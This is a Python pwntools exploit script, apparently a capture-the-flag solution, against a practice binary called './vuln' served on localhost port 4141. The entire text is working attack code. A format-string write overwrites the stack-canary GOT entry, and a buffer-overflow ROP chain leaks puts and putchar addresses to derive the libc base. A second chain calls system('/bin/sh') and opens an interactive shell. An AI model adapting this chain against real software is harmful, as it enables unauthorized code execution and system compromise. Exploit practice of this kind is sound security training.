#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4141)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    global libc
    libc = ELF('/usr/lib/libc.so.6')
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    global libc
    libc = ELF('./libc.so.6')
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

pop_rdi = 0x0000000000400843 #: pop rdi; ret;
ret = 0x0000000000400596 #: ret;

stack_chk_got = 0x601028
puts_got = 0x601020
putchar_got = 0x601018
puts_plt = 0x4005c0
putchar_plt = 0x4005b0

vuln = 0x4006f7

io = start()

p = b''
p += b'%171x|%10$s|%10$hhn|%10$s|ENDSTR'
p = p.ljust(8*4, b'A')
p += p64(stack_chk_got)
p += b'A'*(0x110-len(p))
p += b'B'*8
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(pop_rdi)
p += p64(putchar_got)
p += p64(puts_plt)
p += p64(ret)
p += p64(vuln)

io.recvuntil(': ')

io.sendline(p)

io.recvuntil(': \n')

data = io.recvuntil('ENDSTR').split(b'|')
io.recv(5)

leak1 = u64(io.recv(6).ljust(8, b'\x00'))
io.recv(1) # \n
leak2 = u64(io.recv(6).ljust(8, b'\x00'))

libc_base = leak1 - libc.symbols['puts']

log.success(f'PUTS: {hex(leak1)}')
log.success(f'PUTCHAR: {hex(leak2)}')
log.success(f'LIBC BASE: {hex(libc_base)}')

p = b''
p += b'A'*0x110
p += b'B'*8
p += p64(pop_rdi)
p += p64(next(libc.search(b'/bin/sh\0')) + libc_base)
p += p64(ret)
p += p64(libc.symbols['system'] + libc_base)

io.recvuntil(': ')

io.sendline(p)

io.interactive()

